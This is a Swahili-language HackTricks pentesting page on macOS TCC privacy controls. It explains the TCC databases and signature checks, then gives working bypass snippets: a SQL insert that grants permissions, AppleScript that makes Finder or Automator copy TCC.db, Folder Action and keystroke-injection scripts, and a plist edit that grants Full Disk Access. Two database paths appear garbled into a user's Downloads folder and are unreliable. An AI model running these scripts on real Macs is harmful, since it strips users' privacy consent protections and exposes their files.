# macOS TCC

{{#include ../../../../banners/hacktricks-training.md}}

## **Basic Information**

**TCC (Transparency, Consent, and Control)** ni itifaki ya usalama inayolenga kudhibiti ruhusa za programu. Jukumu lake kuu ni kulinda vipengele nyeti kama **huduma za eneo, mawasiliano, picha, kipaza sauti, kamera, upatikanaji, na ufikiaji wa diski nzima**. Kwa kuhitaji idhini wazi ya mtumiaji kabla ya kutoa ruhusa ya programu kwa vipengele hivi, TCC inaboresha faragha na udhibiti wa mtumiaji juu ya data zao.

Watumiaji wanakutana na TCC wakati programu zinapohitaji ufikiaji wa vipengele vilivyolindwa. Hii inaonekana kupitia kipeperushi kinachowaruhusu watumiaji **kuthibitisha au kukataa ufikiaji**. Zaidi ya hayo, TCC inaruhusu vitendo vya moja kwa moja vya mtumiaji, kama **kuvuta na kuweka faili ndani ya programu**, ili kutoa ufikiaji wa faili maalum, kuhakikisha kwamba programu zina ufikiaji tu wa kile kilichoruhusiwa wazi.

![An example of a TCC prompt](https://rainforest.engineering/images/posts/macos-tcc/tcc-prompt.png?1620047855)

**TCC** inashughulikiwa na **daemon** iliyoko katika `/System/Library/PrivateFrameworks/TCC.framework/Support/tccd` na imewekwa katika `/System/Library/LaunchDaemons/com.apple.tccd.system.plist` (ikiandikisha huduma ya mach `com.apple.tccd.system`).

Kuna **tccd ya hali ya mtumiaji** inayotembea kwa kila mtumiaji aliyeingia iliyofafanuliwa katika `/System/Library/LaunchAgents/com.apple.tccd.plist` ikisajili huduma za mach `com.apple.tccd` na `com.apple.usernotifications.delegate.com.apple.tccd`.

Hapa unaweza kuona tccd ikifanya kazi kama mfumo na kama mtumiaji:
```bash
ps -ef | grep tcc
0   374     1   0 Thu07PM ??         2:01.66 /System/Library/PrivateFrameworks/TCC.framework/Support/tccd system
501 63079     1   0  6:59PM ??         0:01.95 /System/Library/PrivateFrameworks/TCC.framework/Support/tccd
```
Permissions zinapatikana **kutoka kwa programu ya mzazi** na **permissions** zinarekodiwa kulingana na **Bundle ID** na **Developer ID**.

### TCC Databases

Ruhusa/zuia kisha zinawekwa katika baadhi ya hifadhidata za TCC:

- Hifadhidata ya mfumo mzima katika **`/Library/Application Support/com.apple.TCC/TCC.db`**.
- Hifadhidata hii ina **ulinzi wa SIP**, hivyo ni lazima kupita SIP ili kuandika ndani yake.
- Hifadhidata ya mtumiaji TCC **`$HOME/Library/Application Support/com.apple.TCC/TCC.db`** kwa mapendeleo ya mtumiaji binafsi.
- Hifadhidata hii inalindwa hivyo ni lazima michakato yenye ruhusa za juu za TCC kama Upatikanaji wa Disk Kamili inaweza kuandika ndani yake (lakini haijalindwa na SIP).

> [!WARNING]
> Hifadhidata za awali pia zina **ulinzi wa TCC kwa upatikanaji wa kusoma**. Hivyo hu **wezi kusoma** hifadhidata yako ya kawaida ya mtumiaji TCC isipokuwa inatoka kwa mchakato wenye ruhusa za TCC.
>
> Hata hivyo, kumbuka kwamba mchakato wenye ruhusa hizi za juu (kama **FDA** au **`kTCCServiceEndpointSecurityClient`**) utaweza kuandika hifadhidata ya TCC ya watumiaji.

- Kuna hifadhidata ya **tatu** ya TCC katika **`/var/db/locationd/clients.plist`** kuonyesha wateja walio ruhusiwa **kupata huduma za eneo**.
- Faili iliyo na ulinzi wa SIP **`/Users/carlospolop/Downloads/REG.db`** (pia inalindwa dhidi ya upatikanaji wa kusoma kwa TCC), ina **eneo** la hifadhidata zote za **halali za TCC**.
- Faili iliyo na ulinzi wa SIP **`/Users/carlospolop/Downloads/MDMOverrides.plist`** (pia inalindwa dhidi ya upatikanaji wa kusoma kwa TCC), ina ruhusa zaidi za TCC zilizotolewa.
- Faili iliyo na ulinzi wa SIP **`/Library/Apple/Library/Bundles/TCC_Compatibility.bundle/Contents/Resources/AllowApplicationsList.plist`** (inaweza kusomwa na mtu yeyote) ni orodha ya ruhusa za programu zinazohitaji ubaguzi wa TCC.

> [!TIP]
> Hifadhidata ya TCC katika **iOS** iko katika **`/private/var/mobile/Library/TCC/TCC.db`**

> [!NOTE]
> **Kituo cha arifa UI** kinaweza kufanya **mabadiliko katika hifadhidata ya TCC ya mfumo**:
>
> ```bash
> codesign -dv --entitlements :- /System/Library/PrivateFrameworks/TCC.framework/> Support/tccd
> [..]
> com.apple.private.tcc.manager
> com.apple.rootless.storage.TCC
> ```
>
> Hata hivyo, watumiaji wanaweza **kufuta au kuuliza sheria** kwa kutumia **`tccutil`** zana ya amri.

#### Uliza hifadhidata

{{#tabs}}
{{#tab name="user DB"}}
```bash
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db
sqlite> .schema
# Tables: admin, policies, active_policy, access, access_overrides, expired, active_policy_id
# The table access contains the permissions per services
sqlite> select service, client, auth_value, auth_reason from access;
kTCCServiceLiverpool|com.apple.syncdefaultsd|2|4
kTCCServiceSystemPolicyDownloadsFolder|com.tinyspeck.slackmacgap|2|2
kTCCServiceMicrophone|us.zoom.xos|2|2
[...]

# Check user approved permissions for telegram
sqlite> select * from access where client LIKE "%telegram%" and auth_value=2;
# Check user denied permissions for telegram
sqlite> select * from access where client LIKE "%telegram%" and auth_value=0;
```
{{#endtab}}

{{#tab name="system DB"}}
```bash
sqlite3 /Library/Application\ Support/com.apple.TCC/TCC.db
sqlite> .schema
# Tables: admin, policies, active_policy, access, access_overrides, expired, active_policy_id
# The table access contains the permissions per services
sqlite> select service, client, auth_value, auth_reason from access;
kTCCServiceLiverpool|com.apple.syncdefaultsd|2|4
kTCCServiceSystemPolicyDownloadsFolder|com.tinyspeck.slackmacgap|2|2
kTCCServiceMicrophone|us.zoom.xos|2|2
[...]

# Get all FDA
sqlite> select service, client, auth_value, auth_reason from access where service = "kTCCServiceSystemPolicyAllFiles" and auth_value=2;

# Check user approved permissions for telegram
sqlite> select * from access where client LIKE "%telegram%" and auth_value=2;
# Check user denied permissions for telegram
sqlite> select * from access where client LIKE "%telegram%" and auth_value=0;
```
{{#endtab}}
{{#endtabs}}

> [!TIP]
> Kuangalia hifadhidata zote mbili unaweza kuangalia ruhusa ambazo programu imekubali, imekataza, au haina (itauliza).

- **`service`** ni uwakilishi wa mfuatano wa **ruhusa** za TCC
- **`client`** ni **bundle ID** au **njia ya binary** yenye ruhusa
- **`client_type`** inaonyesha ikiwa ni Kitambulisho cha Bundle(0) au njia kamili(1)

<details>

<summary>Jinsi ya kutekeleza ikiwa ni njia kamili</summary>

Fanya tu **`launctl load you_bin.plist`**, na plist kama:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<!-- Label for the job -->
<key>Label</key>
<string>com.example.yourbinary</string>

<!-- The path to the executable -->
<key>Program</key>
<string>/path/to/binary</string>

<!-- Arguments to pass to the executable (if any) -->
<key>ProgramArguments</key>
<array>
<string>arg1</string>
<string>arg2</string>
</array>

<!-- Run at load -->
<key>RunAtLoad</key>
<true/>

<!-- Keep the job alive, restart if necessary -->
<key>KeepAlive</key>
<true/>

<!-- Standard output and error paths (optional) -->
<key>StandardOutPath</key>
<string>/tmp/YourBinary.stdout</string>
<key>StandardErrorPath</key>
<string>/tmp/YourBinary.stderr</string>
</dict>
</plist>
```
</details>

- **`auth_value`** inaweza kuwa na thamani tofauti: denied(0), unknown(1), allowed(2), au limited(3).
- **`auth_reason`** inaweza kuchukua thamani zifuatazo: Error(1), User Consent(2), User Set(3), System Set(4), Service Policy(5), MDM Policy(6), Override Policy(7), Missing usage string(8), Prompt Timeout(9), Preflight Unknown(10), Entitled(11), App Type Policy(12)
- Uwanja wa **csreq** upo ili kuonyesha jinsi ya kuthibitisha binary ili kutekeleza na kutoa ruhusa za TCC:
```bash
# Query to get cserq in printable hex
select service, client, hex(csreq) from access where auth_value=2;

# To decode it (https://stackoverflow.com/questions/52706542/how-to-get-csreq-of-macos-application-on-command-line):
BLOB="FADE0C000000003000000001000000060000000200000012636F6D2E6170706C652E5465726D696E616C000000000003"
echo "$BLOB" | xxd -r -p > terminal-csreq.bin
csreq -r- -t < terminal-csreq.bin

# To create a new one (https://stackoverflow.com/questions/52706542/how-to-get-csreq-of-macos-application-on-command-line):
REQ_STR=$(codesign -d -r- /Applications/Utilities/Terminal.app/ 2>&1 | awk -F ' => ' '/designated/{print $2}')
echo "$REQ_STR" | csreq -r- -b /tmp/csreq.bin
REQ_HEX=$(xxd -p /tmp/csreq.bin  | tr -d '\n')
echo "X'$REQ_HEX'"
```
- Kwa maelezo zaidi kuhusu **sehemu nyingine** za jedwali [**angalia chapisho hili la blog**](https://www.rainforestqa.com/blog/macos-tcc-db-deep-dive).

Unaweza pia kuangalia **idhini zilizotolewa tayari** kwa programu katika `System Preferences --> Security & Privacy --> Privacy --> Files and Folders`.

> [!TIP]
> Watumiaji _wanaweza_ **kufuta au kuuliza sheria** kwa kutumia **`tccutil`**.

#### Rejesha ruhusa za TCC
```bash
# You can reset all the permissions given to an application with
tccutil reset All app.some.id

# Reset the permissions granted to all apps
tccutil reset All
```
### TCC Signature Checks

Hifadhi ya TCC **inahifadhi** **Bundle ID** ya programu, lakini pia **inahifadhi** **habari** kuhusu **sahihi** ili **kuhakikisha** App inayotaka kutumia ruhusa ni sahihi.
```bash
# From sqlite
sqlite> select service, client, hex(csreq) from access where auth_value=2;
#Get csreq

# From bash
echo FADE0C00000000CC000000010000000600000007000000060000000F0000000E000000000000000A2A864886F763640601090000000000000000000600000006000000060000000F0000000E000000010000000A2A864886F763640602060000000000000000000E000000000000000A2A864886F7636406010D0000000000000000000B000000000000000A7375626A6563742E4F550000000000010000000A364E33385657533542580000000000020000001572752E6B656570636F6465722E54656C656772616D000000 | xxd -r -p - > /tmp/telegram_csreq.bin
## Get signature checks
csreq -t -r /tmp/telegram_csreq.bin
(anchor apple generic and certificate leaf[field.1.2.840.113635.100.6.1.9] /* exists */ or anchor apple generic and certificate 1[field.1.2.840.113635.100.6.2.6] /* exists */ and certificate leaf[field.1.2.840.113635.100.6.1.13] /* exists */ and certificate leaf[subject.OU] = "6N38VWS5BX") and identifier "ru.keepcoder.Telegram"
```
> [!WARNING]
> Hivyo, programu nyingine zinazotumia jina moja na ID ya kifurushi hazitaweza kupata ruhusa zilizotolewa kwa programu nyingine.

### Haki & Ruhusa za TCC

Programu **hazihitaji tu** **kuomba** na **kupewa ruhusa** kwa baadhi ya rasilimali, zinahitaji pia **kuwa na haki zinazofaa**.\
Kwa mfano, **Telegram** ina haki `com.apple.security.device.camera` kuomba **ruhusa ya kutumia kamera**. Programu **ambayo haina** haki hii **haitaweza** kupata kamera (na mtumiaji hataulizwa kuhusu ruhusa).

Hata hivyo, ili programu **zipate** **kufikia** **folda fulani za mtumiaji**, kama vile `~/Desktop`, `~/Downloads` na `~/Documents`, **hazihitaji** kuwa na haki maalum **zozote.** Mfumo utaendesha ufikiaji kwa uwazi na **kuuliza mtumiaji** inapohitajika.

Programu za Apple **hazitaunda maonyesho**. Zinajumuisha **haki zilizotolewa mapema** katika orodha yao ya **haki**, ikimaanisha hazita **wahi kuunda popup**, **wala** hazitaonekana katika yoyote ya **maktaba za TCC.** Kwa mfano:
```bash
codesign -dv --entitlements :- /System/Applications/Calendar.app
[...]
<key>com.apple.private.tcc.allow</key>
<array>
<string>kTCCServiceReminders</string>
<string>kTCCServiceCalendar</string>
<string>kTCCServiceAddressBook</string>
</array>
```
Hii itakwepa Calendar kuomba mtumiaji kupata kumbukumbu, kalenda na kitabu cha anwani.

> [!TIP]
> Mbali na baadhi ya nyaraka rasmi kuhusu ruhusa, pia inawezekana kupata **habari za kuvutia kuhusu ruhusa katika** [**https://newosxbook.com/ent.jl**](https://newosxbook.com/ent.jl)

Baadhi ya ruhusa za TCC ni: kTCCServiceAppleEvents, kTCCServiceCalendar, kTCCServicePhotos... Hakuna orodha ya umma inayofafanua zote lakini unaweza kuangalia hii [**orodha ya zinazojulikana**](https://www.rainforestqa.com/blog/macos-tcc-db-deep-dive#service).

### Mahali salama yasiyolindwa

- $HOME (mwenyewe)
- $HOME/.ssh, $HOME/.aws, n.k.
- /tmp

### Nia ya Mtumiaji / com.apple.macl

Kama ilivyotajwa hapo awali, inawezekana **kutoa ruhusa kwa App kwa faili kwa kuhamasisha na kuacha**. Ruhusa hii haitatajwa katika yoyote TCC database lakini kama **sifa** **panua ya faili**. Sifa hii itahifadhi **UUID** ya app iliyoidhinishwa:
```bash
xattr Desktop/private.txt
com.apple.macl

# Check extra access to the file
## Script from https://gist.githubusercontent.com/brunerd/8bbf9ba66b2a7787e1a6658816f3ad3b/raw/34cabe2751fb487dc7c3de544d1eb4be04701ac5/maclTrack.command
macl_read Desktop/private.txt
Filename,Header,App UUID
"Desktop/private.txt",0300,769FD8F1-90E0-3206-808C-A8947BEBD6C3

# Get the UUID of the app
otool -l /System/Applications/Utilities/Terminal.app/Contents/MacOS/Terminal| grep uuid
uuid 769FD8F1-90E0-3206-808C-A8947BEBD6C3
```
> [!NOTE]
> Ni ya kushangaza kwamba sifa ya **`com.apple.macl`** inasimamiwa na **Sandbox**, si tccd.
>
> Pia kumbuka kwamba ikiwa unahamisha faili inayoruhusu UUID ya programu kwenye kompyuta yako kwenda kwenye kompyuta tofauti, kwa sababu programu hiyo hiyo itakuwa na UIDs tofauti, haitatoa ufikiaji kwa programu hiyo.

Sifa ya ziada `com.apple.macl` **haiwezi kufutwa** kama sifa nyingine za ziada kwa sababu in **lindwa na SIP**. Hata hivyo, kama [**ilivyoelezwa katika chapisho hili**](https://www.brunerd.com/blog/2020/01/07/track-and-tackle-com-apple-macl/), inawezekana kuizima **kwa kuzipa** faili, **kuifuta** na **kuifungua**.

## TCC Privesc & Bypasses

### Ingiza kwenye TCC

Ikiwa katika wakati fulani unafanikiwa kupata ufikiaji wa kuandika kwenye hifadhidata ya TCC unaweza kutumia kitu kama ifuatavyo kuongeza kipengee (ondoa maoni):

<details>

<summary>Ingiza kwenye TCC mfano</summary>
```sql
INSERT INTO access (
service,
client,
client_type,
auth_value,
auth_reason,
auth_version,
csreq,
policy_id,
indirect_object_identifier_type,
indirect_object_identifier,
indirect_object_code_identity,
flags,
last_modified,
pid,
pid_version,
boot_uuid,
last_reminded
) VALUES (
'kTCCServiceSystemPolicyDesktopFolder', -- service
'com.googlecode.iterm2', -- client
0, -- client_type (0 - bundle id)
2, -- auth_value  (2 - allowed)
3, -- auth_reason (3 - "User Set")
1, -- auth_version (always 1)
X'FADE0C00000000C40000000100000006000000060000000F0000000200000015636F6D2E676F6F676C65636F64652E697465726D32000000000000070000000E000000000000000A2A864886F7636406010900000000000000000006000000060000000E000000010000000A2A864886F763640602060000000000000000000E000000000000000A2A864886F7636406010D0000000000000000000B000000000000000A7375626A6563742E4F550000000000010000000A483756375859565137440000', -- csreq is a BLOB, set to NULL for now
NULL, -- policy_id
NULL, -- indirect_object_identifier_type
'UNUSED', -- indirect_object_identifier - default value
NULL, -- indirect_object_code_identity
0, -- flags
strftime('%s', 'now'), -- last_modified with default current timestamp
NULL, -- assuming pid is an integer and optional
NULL, -- assuming pid_version is an integer and optional
'UNUSED', -- default value for boot_uuid
strftime('%s', 'now') -- last_reminded with default current timestamp
);
```
</details>

### TCC Payloads

Ikiwa umeweza kuingia ndani ya programu yenye ruhusa za TCC angalia ukurasa ufuatao wenye payloads za TCC ili kuzitumia vibaya:

{{#ref}}
macos-tcc-payloads.md
{{#endref}}

### Apple Events

Jifunze kuhusu Apple Events katika:

{{#ref}}
macos-apple-events.md
{{#endref}}

### Automation (Finder) to FDA\*

Jina la TCC la ruhusa ya Automation ni: **`kTCCServiceAppleEvents`**\
Ruhusa hii maalum ya TCC pia inaashiria **programu ambayo inaweza kudhibitiwa** ndani ya database ya TCC (hivyo ruhusa haziruhusu kudhibiti kila kitu).

**Finder** ni programu ambayo **daima ina FDA** (hata kama haionekani kwenye UI), hivyo ikiwa una **Automation** ruhusa juu yake, unaweza kutumia ruhusa zake ili **kuifanya ifanye baadhi ya vitendo**.\
Katika kesi hii programu yako itahitaji ruhusa **`kTCCServiceAppleEvents`** juu ya **`com.apple.Finder`**.

{{#tabs}}
{{#tab name="Steal users TCC.db"}}
```applescript
# This AppleScript will copy the system TCC database into /tmp
osascript<<EOD
tell application "Finder"
set homeFolder to path to home folder as string
set sourceFile to (homeFolder & "Library:Application Support:com.apple.TCC:TCC.db") as alias
set targetFolder to POSIX file "/tmp" as alias
duplicate file sourceFile to targetFolder with replacing
end tell
EOD
```
{{#endtab}}

{{#tab name="Steal systems TCC.db"}}
```applescript
osascript<<EOD
tell application "Finder"
set sourceFile to POSIX file "/Library/Application Support/com.apple.TCC/TCC.db" as alias
set targetFolder to POSIX file "/tmp" as alias
duplicate file sourceFile to targetFolder with replacing
end tell
EOD
```
{{#endtab}}
{{#endtabs}}

Unaweza kutumia hii **kuandika database yako ya TCC ya mtumiaji**.

> [!WARNING]
> Kwa ruhusa hii utaweza **kuomba finder kufikia folda zilizozuiliwa za TCC** na kukupa faili, lakini kadri ninavyojua huwezi **kufanya Finder itekeleze msimbo wowote** ili kutumia kikamilifu ufikiaji wake wa FDA.
>
> Hivyo basi, huwezi kutumia uwezo wote wa FDA.

Hii ni prompt ya TCC kupata ruhusa za Automation juu ya Finder:

<figure><img src="../../../../images/image (27).png" alt="" width="244"><figcaption></figcaption></figure>

> [!CAUTION]
> Kumbuka kwamba kwa sababu programu ya **Automator** ina ruhusa ya TCC **`kTCCServiceAppleEvents`**, inaweza **kudhibiti programu yoyote**, kama Finder. Hivyo kuwa na ruhusa ya kudhibiti Automator unaweza pia kudhibiti **Finder** kwa msimbo kama huu hapa chini:

<details>

<summary>Pata shell ndani ya Automator</summary>
```applescript
osascript<<EOD
set theScript to "touch /tmp/something"

tell application "Automator"
set actionID to Automator action id "com.apple.RunShellScript"
tell (make new workflow)
add actionID to it
tell last Automator action
set value of setting "inputMethod" to 1
set value of setting "COMMAND_STRING" to theScript
end tell
execute it
end tell
activate
end tell
EOD
# Once inside the shell you can use the previous code to make Finder copy the TCC databases for example and not TCC prompt will appear
```
</details>

Vivyo hivyo na **Script Editor app,** inaweza kudhibiti Finder, lakini kwa kutumia AppleScript huwezi kulazimisha itekeleze script.

### Automation (SE) kwa baadhi ya TCC

**Matukio ya Mfumo yanaweza kuunda Vitendo vya Folda, na Vitendo vya Folda vinaweza kufikia baadhi ya folda za TCC** (Desktop, Documents & Downloads), hivyo script kama ifuatayo inaweza kutumika kuboresha tabia hii:
```bash
# Create script to execute with the action
cat > "/tmp/script.js" <<EOD
var app = Application.currentApplication();
app.includeStandardAdditions = true;
app.doShellScript("cp -r $HOME/Desktop /tmp/desktop");
EOD

osacompile -l JavaScript -o "$HOME/Library/Scripts/Folder Action Scripts/script.scpt" "/tmp/script.js"

# Create folder action with System Events in "$HOME/Desktop"
osascript <<EOD
tell application "System Events"
-- Ensure Folder Actions are enabled
set folder actions enabled to true

-- Define the path to the folder and the script
set homeFolder to path to home folder as text
set folderPath to homeFolder & "Desktop"
set scriptPath to homeFolder & "Library:Scripts:Folder Action Scripts:script.scpt"

-- Create or get the Folder Action for the Desktop
if not (exists folder action folderPath) then
make new folder action at end of folder actions with properties {name:folderPath, path:folderPath}
end if
set myFolderAction to folder action folderPath

-- Attach the script to the Folder Action
if not (exists script scriptPath of myFolderAction) then
make new script at end of scripts of myFolderAction with properties {name:scriptPath, path:scriptPath}
end if

-- Enable the Folder Action and the script
enable myFolderAction
end tell
EOD

# File operations in the folder should trigger the Folder Action
touch "$HOME/Desktop/file"
rm "$HOME/Desktop/file"
```
### Automation (SE) + Accessibility (**`kTCCServicePostEvent`|**`kTCCServiceAccessibility`**)** to FDA\*

Automation kwenye **`System Events`** + Accessibility (**`kTCCServicePostEvent`**) inaruhusu kutuma **mipigo ya funguo kwa michakato**. Kwa njia hii unaweza kutumia Finder kubadilisha TCC.db ya watumiaji au kutoa FDA kwa programu yoyote (ingawa nenosiri linaweza kuombwa kwa hili).

Mfano wa Finder kuandika tena TCC.db ya watumiaji:
```applescript
-- store the TCC.db file to copy in /tmp
osascript <<EOF
tell application "System Events"
-- Open Finder
tell application "Finder" to activate

-- Open the /tmp directory
keystroke "g" using {command down, shift down}
delay 1
keystroke "/tmp"
delay 1
keystroke return
delay 1

-- Select and copy the file
keystroke "TCC.db"
delay 1
keystroke "c" using {command down}
delay 1

-- Resolve $HOME environment variable
set homePath to system attribute "HOME"

-- Navigate to the Desktop directory under $HOME
keystroke "g" using {command down, shift down}
delay 1
keystroke homePath & "/Library/Application Support/com.apple.TCC"
delay 1
keystroke return
delay 1

-- Check if the file exists in the destination and delete if it does (need to send keystorke code: https://macbiblioblog.blogspot.com/2014/12/key-codes-for-function-and-special-keys.html)
keystroke "TCC.db"
delay 1
keystroke return
delay 1
key code 51 using {command down}
delay 1

-- Paste the file
keystroke "v" using {command down}
end tell
EOF
```
### `kTCCServiceAccessibility` kwa FDA\*

Angalia ukurasa huu kwa baadhi ya [**payloads za kutumia ruhusa za Accessibility**](macos-tcc-payloads.md#accessibility) ili privesc kwa FDA\* au kuendesha keylogger kwa mfano.

### **Mteja wa Usalama wa Kituo kwa FDA**

Ikiwa una **`kTCCServiceEndpointSecurityClient`**, una FDA. Mwisho.

### Faili ya Sera ya Mfumo SysAdmin kwa FDA

**`kTCCServiceSystemPolicySysAdminFiles`** inaruhusu **kubadilisha** sifa ya **`NFSHomeDirectory`** ya mtumiaji ambayo inabadilisha folda yake ya nyumbani na hivyo inaruhusu **kuepuka TCC**.

### TCC DB ya Mtumiaji kwa FDA

Kupata **ruhusa za kuandika** juu ya **database ya TCC ya mtumiaji** huwezi kujipa **`FDA`** ruhusa, ni yule aliye katika database ya mfumo pekee anayeweza kutoa hiyo.

Lakini unaweza **kujipe** **`Haki za Automation kwa Finder`**, na kutumia mbinu ya awali ili kupandisha hadhi hadi FDA\*.

### **FDA hadi ruhusa za TCC**

**Upatikanaji wa Disk Kamili** ni jina la TCC ni **`kTCCServiceSystemPolicyAllFiles`**

Sidhani hii ni privesc halisi, lakini kwa bahati mbaya ukiona inafaida: Ikiwa unadhibiti programu yenye FDA unaweza **kubadilisha database ya TCC ya watumiaji na kujipa ufikiaji wowote**. Hii inaweza kuwa na manufaa kama mbinu ya kudumu endapo unaweza kupoteza ruhusa zako za FDA.

### **Kuepuka SIP hadi Kuepuka TCC**

Database ya **TCC ya mfumo** inalindwa na **SIP**, ndiyo maana ni mchakato pekee wenye **entitlements zilizotajwa zitakuwa na uwezo wa kuibadilisha**. Hivyo, ikiwa mshambuliaji atapata **kuepuka SIP** juu ya **faili** (kuwa na uwezo wa kubadilisha faili iliyozuiliwa na SIP), ataweza:

- **Kuondoa ulinzi** wa database ya TCC, na kujipa ruhusa zote za TCC. Anaweza kutumia faili yoyote kati ya hizi kwa mfano:
- Database ya mifumo ya TCC
- REG.db
- MDMOverrides.plist

Hata hivyo, kuna chaguo lingine la kutumia **kuepuka SIP ili kuepuka TCC**, faili `/Library/Apple/Library/Bundles/TCC_Compatibility.bundle/Contents/Resources/AllowApplicationsList.plist` ni orodha ya ruhusa za programu zinazohitaji ubaguzi wa TCC. Hivyo, ikiwa mshambuliaji anaweza **kuondoa ulinzi wa SIP** kutoka kwa faili hii na kuongeza **programu yake mwenyewe** programu hiyo itakuwa na uwezo wa kuepuka TCC.\
Kwa mfano kuongeza terminal:
```bash
# Get needed info
codesign -d -r- /System/Applications/Utilities/Terminal.app
```
AllowApplicationsList.plist:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>Services</key>
<dict>
<key>SystemPolicyAllFiles</key>
<array>
<dict>
<key>CodeRequirement</key>
<string>identifier &quot;com.apple.Terminal&quot; and anchor apple</string>
<key>IdentifierType</key>
<string>bundleID</string>
<key>Identifier</key>
<string>com.apple.Terminal</string>
</dict>
</array>
</dict>
</dict>
</plist>
```
### TCC Bypasses

{{#ref}}
macos-tcc-bypasses/
{{#endref}}

## References

- [**https://www.rainforestqa.com/blog/macos-tcc-db-deep-dive**](https://www.rainforestqa.com/blog/macos-tcc-db-deep-dive)
- [**https://gist.githubusercontent.com/brunerd/8bbf9ba66b2a7787e1a6658816f3ad3b/raw/34cabe2751fb487dc7c3de544d1eb4be04701ac5/maclTrack.command**](https://gist.githubusercontent.com/brunerd/8bbf9ba66b2a7787e1a6658816f3ad3b/raw/34cabe2751fb487dc7c3de544d1eb4be04701ac5/maclTrack.command)
- [**https://www.brunerd.com/blog/2020/01/07/track-and-tackle-com-apple-macl/**](https://www.brunerd.com/blog/2020/01/07/track-and-tackle-com-apple-macl/)
- [**https://www.sentinelone.com/labs/bypassing-macos-tcc-user-privacy-protections-by-accident-and-design/**](https://www.sentinelone.com/labs/bypassing-macos-tcc-user-privacy-protections-by-accident-and-design/)

{{#include ../../../../banners/hacktricks-training.md}}
